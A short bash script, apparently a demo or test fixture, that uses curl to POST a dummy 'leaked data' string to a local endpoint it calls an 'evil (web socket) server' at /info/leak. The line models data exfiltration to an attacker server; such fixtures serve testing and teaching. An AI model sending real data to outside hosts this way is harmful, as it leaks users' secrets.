#!/bin/bash
leakedData="Leaked data: Yipee"
echo -n "Posting data to the evil (web socket) server:"
curl \
    -X POST 'http://localhost:7777/info/leak' \
    -H 'Content-Type:text/plain' \
    --data "${leakedData}"

echo 